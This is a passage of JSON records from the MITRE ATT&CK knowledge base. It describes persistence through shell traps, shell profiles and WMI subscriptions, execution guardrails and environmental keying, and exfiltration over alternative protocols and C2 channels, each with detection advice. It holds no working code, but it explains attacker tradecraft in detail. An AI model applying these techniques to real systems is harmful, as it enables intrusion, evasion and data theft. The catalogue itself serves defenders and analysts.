PE files may indicate outliers among legitimate screensavers in a network and should be investigated.","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Bartosz Jerzman","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Gazer Aug 2017),(Citation: TechNet Screensaver GP)"}
{"ID":"T1546.005","name":"Event Triggered Execution: Trap","description":"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)","url":"https://attack.mitre.org/techniques/T1546/005","created":"24 January 2020","last modified":"24 March 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1546.004","name":"Event Triggered Execution: Unix Shell Configuration Modification","description":"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.","url":"https://attack.mitre.org/techniques/T1546/004","created":"24 January 2020","last modified":"20 August 2021","version":"2.1","tactics":"Persistence, Privilege Escalation","detection":"While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\nMonitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.(Citation: ESF_filemonitor) \n\nFor most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.\n","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Robert Wilson; Tony Lambert, Red Canary","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Anomali Linux Rabbit 2018),"}
{"ID":"T1546.003","name":"Event Triggered Execution: Windows Management Instrumentation Event Subscription","description":"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.","url":"https://attack.mitre.org/techniques/T1546/003","created":"24 January 2020","last modified":"21 April 2023","version":"1.3","tactics":"Persistence, Privilege Escalation","detection":"Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.(Citation: TechNet Autoruns)(Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).(Citation: Microsoft Register-WmiEvent)","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, WMI: WMI Creation","is sub-technique":true,"sub-technique of":"T1546","defenses bypassed":null,"contributors":"Brent Murphy, Elastic; David French, Elastic","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: GitHub PoshC2),(Citation: Microsoft Holmium June 2020),(Citation: Mandiant No Easy Breach),(Citation: FireEye Periscope March 2018),(Citation: FireEye POSHSPY April 2017),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FireEye APT33 Guardrail),(Citation: FireEye WMI 2015),(Citation: SentinelLabs Metador Sept 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft 365 Defender Solorigate),(Citation: RedCanary Mockingbird May 2020),(Citation: win10_asr),(Citation: FireEye WMI 2015)"}
{"ID":"T1480","name":"Execution Guardrails","description":"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.","url":"https://attack.mitre.org/techniques/T1480","created":"31 January 2019","last modified":"03 May 2022","version":"1.1","tactics":"Defense Evasion","detection":"Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Host Forensic Analysis, Signature-based Detection, Static File Analysis","contributors":"Nick Carr, Mandiant","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Lazarus Nov 2020),(Citation: Mandiant APT41),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: CrowdStrike SUNSPOT Implant January 2021),"}
{"ID":"T1480.001","name":"Execution Guardrails: Environmental Keying","description":"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","url":"https://attack.mitre.org/techniques/T1480/001","created":"23 June 2020","last modified":"04 May 2022","version":"1.0","tactics":"Defense Evasion","detection":"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1480","defenses bypassed":"Anti-virus, Host Forensic Analysis, Signature-based Detection, Static File Analysis","contributors":"Nick Carr, Mandiant","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Twitter ItsReallyNick APT41 EK),(Citation: Novetta Winnti April 2015),(Citation: Kaspersky Equation QA),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Kaspersky Gauss Whitepaper),(Citation: ESET InvisiMole June 2020),(Citation: Microsoft Actinium February 2022),"}
{"ID":"T1048","name":"Exfiltration Over Alternative Protocol","description":"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).","url":"https://attack.mitre.org/techniques/T1048","created":"31 May 2017","last modified":"15 April 2023","version":"1.4","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Cloud Storage: Cloud Storage Access, Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Abarca; William Cain","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AADInternals Documentation),(Citation: Cybereason Chaes Nov 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: ESET Kobalos Feb 2021),(Citation: Talos PoetRAT April 2020),(Citation: Cisco Talos Intelligence Group),(Citation: 20 macOS Common Tools and Techniques),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Amazon  AWS Temporary Security Credentials),(Citation: Amazon S3 Security, 2019),(Citation: Microsoft Azure Storage Security, 2019),(Citation: TechNet Firewall Design)"}
{"ID":"T1048.002","name":"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ","url":"https://attack.mitre.org/techniques/T1048/002","created":"15 March 2020","last modified":"15 October 2021","version":"1.1","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1048","defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Rclone),(Citation: TechNet Firewall Design)"}
{"ID":"T1048.001","name":"Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ","url":"https://attack.mitre.org/techniques/T1048/001","created":"15 March 2020","last modified":"28 March 2020","version":"1.0","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) \n\nArtifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1048","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: TechNet Firewall Design)"}
{"ID":"T1048.003","name":"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ","url":"https://attack.mitre.org/techniques/T1048/003","created":"15 March 2020","last modified":"12 April 2023","version":"2.1","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) \n\nFor network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1048","defenses bypassed":null,"contributors":"Austin Clark, @c2defense; William Cain","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky ProjectSauron Full Report),(Citation: McAfee Gold Dragon),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Microsoft BITSAdmin),(Citation: Palo Alto OilRig Oct 2016),(Citation: Symantec Thrip June 2018),(Citation: Novetta Blockbuster RATs),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Medium KONNI Jan 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Talos Agent Tesla Oct 2018),(Citation: Rclone),(Citation: Trend Micro FIN6 October 2019),(Citation: Mandiant APT41),(Citation: Novetta Blockbuster),(Citation: Linux FTP),(Citation: Symantec Elfin Mar 2019),(Citation: ESET ForSSHe December 2018),(Citation: objective-see windtail2 jan 2019),(Citation: Microsoft FTP),(Citation: FireEye APT37 Feb 2018),(Citation: Trustwave Cherry Picker),(Citation: DFIR Ryuk's Return October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET OceanLotus Mar 2019),(Citation: Talos PoetRAT April 2020),(Citation: F-Secure Cosmicduke),(Citation: ESET Carbon Mar 2017),(Citation: hexed osx.dok analysis 2019),(Citation: Bitdefender Agent Tesla April 2020),(Citation: TechNet Firewall Design)"}
{"ID":"T1041","name":"Exfiltration Over C2 Channel","description":"Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.","url":"https://attack.mitre.org/techniques/T1041","created":"31 May 2017","last modified":"07 April 2023","version":"2.2","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Trusteer Carberp October 2010),(Citation: Secureworks REvil September 2019),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: ProofPoint Ursnif Aug 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FSecure Lokibot November 2019),(Citation: ESET Okrum July 2019),(Citation: wardle evilquest partii),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: NCSC Cyclops Blink February 2022),(Citation: Github PowerShell Empire),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Unit 42 PingPull Jun 2022),(Citation: Talos Promethium June 2020),(Citation: ESET Sednit Part 2),(Citation: Bitdefender StrongPity June 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Unit 42 MechaFlounder March 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Talos ROKRAT),(Citation: ClearSky Siamesekitten August 2021),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Cybereason Valak May 2020),(Citation: FireEye HAWKBALL Jun 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Check Point APT34 April 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: Malwarebytes Dyreza November 2015),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT30),(Citation: Google EXOTIC LILY March 2022),(Citation: SentinelOne Valak June 2020),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: reed thiefquest ransomware analysis),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Unit42 Molerat Mar 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Securelist Remexi Jan 2019),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET Crutch December 2020),(Citation: FireEye Ursnif Nov 2017),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: NSA/FBI Drovorub August 2020),(Citation: Unit 42 Valak July 2020),(Citation: Talos PoetRAT October 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: GitHub Sliver Download),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Intezer Doki July 20),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta Blockbuster Loaders),(Citation: ESET Telebots Dec 2016),(Citation: Securelist Octopus Oct 2018),(Citation: FireEye Clandestine Fox),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Prevailion EvilNum May 2020),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Industroyer),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET ForSSHe December 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: Prevx Carberp March 2011),(Citation: CISA Zebrocy Oct 2020),(Citation: ESET OceanLotus Mar 2019),(Citation: CrowdStrike IceApple May 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: CrowdStrike Grim Spider May 2019),(Citation: ESET Windigo Mar 2014),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Unit42 RDAT July 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Trend Micro Emotet Jan 2019),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Chimera January 2021),(Citation: Cybereason Astaroth Feb 2019),(Citation: GitHub Pupy),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: ESET LightNeuron May 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: McAfee Bankshot),(Citation: Kaspersky QakBot September 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Reaqta MuddyWater November 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro njRAT 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: McAfee GhostSecret),(Citation: University of Birmingham C2)"}
{"ID":"T1011","name":"Exfiltration Over Other Network Medium","description":"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","url":"https://attack.mitre.org/techniques/T1011","created":"31 May 2017","last modified":"08 March 2022","version":"1.1","tactics":"Exfiltration","detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Itzik Kotler, SafeBreach","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: TechRepublic Wireless GPO FEB 2009),(Citation: Microsoft GPO Bluetooth FEB 2009)"}
